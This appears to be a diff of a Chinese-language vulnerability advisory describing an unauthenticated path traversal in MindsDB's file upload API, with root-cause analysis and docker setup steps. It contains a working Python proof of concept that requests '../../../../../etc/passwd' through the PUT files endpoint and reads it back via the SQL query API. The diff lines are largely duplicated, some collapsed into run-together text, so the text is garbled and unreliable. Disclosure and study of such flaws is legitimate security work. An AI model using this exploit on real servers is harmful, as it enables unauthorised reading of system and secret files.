@@ -25,11 +25,11 @@ MindsDB 的文件上传 API 存在未授权路径遍历漏洞。攻击者无需�
 ##   
   
 漏洞根源在于 file.py 文件中的 PUT 处理函数存在路径清理缺失问题。当请求体为 JSON 格式且 source_type 不为 "url" 时，程序会将用户可控数据直接拼接为文件系统路径，具体流程如下：  
-1. 程序在第 104 行左右通过 data = request.json  
- 接收攻击者输入，未对输入数据进行任何有效性验证；  
+1. 程序在第 104 行左右通过 data = request.json  
+ 接收攻击者输入，未对输入数据进行任何有效性验证；  
   
-1. 第 178 行左右通过 file_path = os.path.join(temp_dir_path, data["file"])  
- 在临时目录内构造文件路径。但如果攻击者在 data["file"] 中传入绝对路径（例如 /home/secret.csv），os.path.join 函数会忽略预设的 temp_dir_path，直接定位到攻击者指定的路径；  
+1. 第 178 行左右通过 file_path = os.path.join(temp_dir_path, data["file"])  
+ 在临时目录内构造文件路径。但如果攻击者在 data["file"] 中传入绝对路径（例如 /home/secret.csv），os.path.join 函数会忽略预设的 temp_dir_path，直接定位到攻击者指定的路径；  
   
 1. 构造后的路径会传递给 ca.file_controller.save_file(...) 函数，该函数在 mindsdb/interfaces/file/file_controller.py 的第 66 行通过 FileReader(path=source_path) 读取指定路径文件的内容。后续的 shutil.move(file_path, ...) 调用会将目标文件迁移至 MindsDB 的管理存储目录；  
   
@@ -43,26 +43,26 @@ MindsDB 的文件上传 API 存在未授权路径遍历漏洞。攻击者无需�
   
 拉取并运行最新版 MindsDB 容器：  
 ```
-docker pull mindsdb/mindsdb:latestdocker run --rm -it -p 47334:47334 --name mindsdb-poc mindsdb/mindsdb:latest
+docker pull mindsdb/mindsdb:latestdocker run --rm -it -p 47334:47334 --name mindsdb-poc mindsdb/mindsdb:latest
 docker pull mindsdb/mindsdb:latest
-docker run --rm -it -p 47334:47334 --name mindsdb-poc mindsdb/mindsdb:latest
+docker run --rm -it -p 47334:47334 --name mindsdb-poc mindsdb/mindsdb:latest
 ```  
 ### 2. 执行漏洞利用脚本  
   
 在主机端创建 poc.py 文件，写入以下代码并通过 Python 执行：  
 ```
-# poc.pyimport requests, jsonbase = "http://127.0.0.1:47334"# 未指定 source_type，触发漏洞代码分支，通过相对路径遍历读取 /etc/passwdpayload = {"file": "../../../../../etc/passwd"}  r = requests.put(f"{base}/api/files/leak_rel", json=payload, timeout=10)print("PUT status:", r.status_code, r.text)q = requests.post(    f"{base}/api/sql/query",    json={"query": "SELECT * FROM files.leak_rel"},    timeout=10,)print("SQL response:", json.dumps(q.json(), indent=2))
+# poc.pyimport requests, jsonbase = "http://127.0.0.1:47334"# 未指定 source_type，触发漏洞代码分支，通过相对路径遍历读取 /etc/passwdpayload = {"file": "../../../../../etc/passwd"}  r = requests.put(f"{base}/api/files/leak_rel", json=payload, timeout=10)print("PUT status:", r.status_code, r.text)q = requests.post(    f"{base}/api/sql/query",    json={"query": "SELECT * FROM files.leak_rel"},    timeout=10,)print("SQL response:", json.dumps(q.json(), indent=2))
 # poc.py
-import requests, json
-base = "http://127.0.0.1:47334"
+import requests, json
+base = "http://127.0.0.1:47334"
 # 未指定 source_type，触发漏洞代码分支，通过相对路径遍历读取 /etc/passwd
-payload = {"file": "../../../../../etc/passwd"}  
+payload = {"file": "../../../../../etc/passwd"}  
 r = requests.put(f"{base}/api/files/leak_rel", json=payload, timeout=10)
 print("PUT status:", r.status_code, r.text)
 q = requests.post(
-    f"{base}/api/sql/query",
-    json={"query": "SELECT * FROM files.leak_rel"},
-    timeout=10,
+    f"{base}/api/sql/query",
+    json={"query": "SELECT * FROM files.leak_rel"},
+    timeout=10,
 )
 print("SQL response:", json.dumps(q.json(), indent=2))
 ```  
